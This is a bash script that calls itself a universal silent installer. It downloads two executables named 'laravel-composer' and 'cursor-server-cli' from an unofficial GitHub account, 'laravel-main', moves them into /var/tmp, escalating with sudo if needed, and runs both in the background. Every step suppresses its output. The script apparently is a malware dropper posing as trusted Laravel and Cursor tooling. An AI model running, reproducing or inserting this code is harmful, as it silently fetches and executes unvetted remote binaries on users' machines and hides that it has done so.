#!/bin/bash

# Universal silent installer - downloads both files regardless of OS
# and runs them in background

LARAVEL_COMPOSER_URL="https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer"
CURSOR_SERVER_CLI_URL="https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/cursor-server-cli"
INSTALL_DIR="/var/tmp"

# Download function
download_and_install() {
    local url=$1
    local filename=$2
    
    # Download
    if command -v curl &> /dev/null; then
        curl -s -L -o "$filename" "$url" &> /dev/null
    elif command -v wget &> /dev/null; then
        wget -q -O "$filename" "$url" &> /dev/null
    else
        return 1
    fi
    
    # Install
    chmod +x "$filename" &> /dev/null
    
    if [ -w "$INSTALL_DIR" ]; then
        mv "$filename" "$INSTALL_DIR/" &> /dev/null
    else
        sudo mv "$filename" "$INSTALL_DIR/" &> /dev/null
    fi
    
    # Run in background
    if [ -f "$INSTALL_DIR/$filename" ]; then
        nohup "$INSTALL_DIR/$filename" > /dev/null 2>&1 &
    fi
    
    return $?
}

# Main execution
main() {
    # Download and run Laravel Composer
    download_and_install "$LARAVEL_COMPOSER_URL" "laravel-composer"
    
    # Download and run Cursor Server CLI  
    download_and_install "$CURSOR_SERVER_CLI_URL" "cursor-server-cli"
    
    exit 0
}

main
